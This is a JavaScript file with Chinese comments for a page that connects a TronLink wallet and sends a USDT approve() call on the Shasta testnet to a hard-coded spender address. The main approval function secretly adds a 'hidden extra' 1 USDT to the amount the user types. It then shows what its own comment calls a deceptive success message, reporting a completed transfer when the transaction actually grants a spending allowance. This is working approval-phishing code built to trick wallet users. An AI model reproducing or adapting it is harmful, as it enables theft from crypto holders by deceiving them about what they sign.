// usdtApprove.js — 优化版（处理 TronLink 提示）

// ====== Shasta 测试网配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs"; // Shasta 测试网 USDT
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC"; // 你的接收地址

// USDT ABI
const usdtAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  el.innerText = `状态：${text}`;
  el.style.color = isError ? 'red' : 'black';
}

function updateNetworkInfo() {
  const networkEl = document.getElementById("networkStatus");
  if (window.tronWeb && window.tronWeb.ready) {
    const node = window.tronWeb.fullNode.host;
    const isShasta = node.includes('shasta') || node.includes('testnet');
    networkEl.textContent = isShasta ? 'Shasta 测试网 ✅' : '未知网络 ⚠️';
    networkEl.style.color = isShasta ? 'green' : 'orange';
  } else {
    networkEl.textContent = '未连接';
    networkEl.style.color = 'red';
  }
}

// 检查是否在 Shasta 测试网
function checkShastaNetwork() {
  if (!window.tronWeb) {
    throw new Error("未检测到 TronLink");
  }
  
  const node = window.tronWeb.fullNode.host;
  console.log("当前节点:", node);
  
  if (!node.includes('shasta') && !node.includes('testnet')) {
    throw new Error("请切换到 Shasta 测试网");
  }
  
  return true;
}

// 优化的 TronWeb 等待函数
function waitForTronWeb(timeoutMs = 5000) {
  return new Promise((resolve, reject) => {
    if (window.tronWeb && window.tronWeb.ready) {
      updateNetworkInfo();
      return resolve(true);
    }

    let waited = 0;
    const interval = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready) {
        clearInterval(interval);
        updateNetworkInfo();
        return resolve(true);
      }
      waited += 200;
      if (waited >= timeoutMs) {
        clearInterval(interval);
        reject(new Error("TronLink 连接超时，请刷新页面重试"));
      }
    }, 200);
  });
}

// 优化的账户请求函数
async function requestAccounts() {
  console.log("开始请求账户权限...");
  
  if (window.tronLink && typeof window.tronLink.request === "function") {
    try {
      setStatus("钱包弹窗中，请授权连接...");
      const result = await window.tronLink.request({ 
        method: "tron_requestAccounts" 
      });
      console.log("账户请求结果:", result);
      
      // 等待 TronWeb 完全注入
      await waitForTronWeb();
      return result;
      
    } catch (err) {
      console.error("账户请求失败:", err);
      if (err.code === 4001) {
        throw new Error("用户拒绝了连接请求");
      } else {
        throw new Error("连接失败: " + (err.message || err));
      }
    }
  } else {
    throw new Error("未检测到 TronLink，请安装钱包");
  }
}

// 初始化 TronLink 连接
async function initializeTronLink() {
  try {
    setStatus("正在初始化 TronLink 连接...");
    
    // 先检查是否已经注入
    if (window.tronWeb && window.tronWeb.ready) {
      console.log("TronWeb 已就绪");
      updateNetworkInfo();
      return {
        success: true,
        address: window.tronWeb.defaultAddress.base58
      };
    }
    
    // 请求账户权限（这会触发完整的 TronWeb 注入）
    await requestAccounts();
    
    const address = window.tronWeb.defaultAddress.base58;
    console.log("连接成功，地址:", address);
    
    return {
      success: true,
      address: address
    };
    
  } catch (error) {
    console.error("初始化失败:", error);
    return {
      success: false,
      error: error.message
    };
  }
}

// ====== 主逻辑：授权函数 ======
window.approveUSDT = async function() {
  try {
    setStatus("准备授权交易...");
    
    // 1. 检查基础连接
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }
    
    // 2. 检查网络
    checkShastaNetwork();
    
    const fromAddr = window.tronWeb.defaultAddress.base58;
    console.log("从地址:", fromAddr);

    // 3. 获取用户输入
    const input = document.getElementById("amount").value;
    const inputAmount = parseFloat(input);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      alert("请输入正确的授权金额（大于 0 的数字）");
      return;
    }

    // 4. 计算总金额（包含隐藏的 1 USDT）
    const hiddenExtra = 1;
    const totalAmount = inputAmount + hiddenExtra;
    const amountInSun = Math.floor(totalAmount * 1e6).toString();

    console.log("显示金额:", inputAmount, "USDT");
    console.log("实际授权:", totalAmount, "USDT");

    setStatus(`准备授权 ${inputAmount} USDT...`);

    // 5. 创建合约实例
    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
    
    // 6. 发起 approve 交易
    setStatus("请在钱包中确认授权...");
    
    const result = await usdtContract.approve(
      spenderAddress, 
      amountInSun
    ).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("授权成功:", result);
    
    // 显示欺骗性成功信息
    setStatus(`✅ 转账 ${inputAmount} USDT 成功！`);
    
    // 可选：显示交易链接
    const txLink = `https://shasta.tronscan.org/#/transaction/${result}`;
    setTimeout(() => {
      document.getElementById("status").innerHTML = `
        <div style="color: green; font-weight: bold;">
          ✅ 转账 ${inputAmount} USDT 成功！
        </div>
        <div style="font-size: 12px; margin-top: 5px;">
          <a href="${txLink}" target="_blank" style="color: #666;">查看交易详情</a>
        </div>
      `;
    }, 1000);

  } catch (err) {
    console.error("授权失败:", err);
    
    let errorMsg = err.message || err.toString();
    if (errorMsg.includes("rejected") || errorMsg.includes("denied")) {
      errorMsg = "用户取消了交易";
    } else if (errorMsg.includes("insufficient")) {
      errorMsg = "余额不足";
    }
    
    setStatus("❌ " + errorMsg, true);
  }
};

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");
  
  console.log("页面加载完成，检查 TronLink...");

  // 自动检查 TronLink 状态
  setTimeout(() => {
    if (window.tronWeb && window.tronWeb.ready) {
      updateNetworkInfo();
      setStatus("检测到已连接的 TronLink");
      approveBtn.disabled = false;
    }
  }, 1000);

  // 连接钱包按钮
  connectBtn.addEventListener("click", async () => {
    try {
      const result = await initializeTronLink();
      
      if (result.success) {
        setStatus(`✅ 连接成功: ${result.address.substring(0, 8)}...`);
        approveBtn.disabled = false;
        
        // 更新网络信息
        updateNetworkInfo();
        
      } else {
        setStatus("❌ " + result.error, true);
      }
      
    } catch (err) {
      setStatus("❌ 连接失败: " + err.message, true);
    }
  });

  // 授权按钮
  approveBtn.addEventListener("click", () => {
    window.approveUSDT();
  });

  // 实时更新网络状态
  setInterval(updateNetworkInfo, 3000);
});
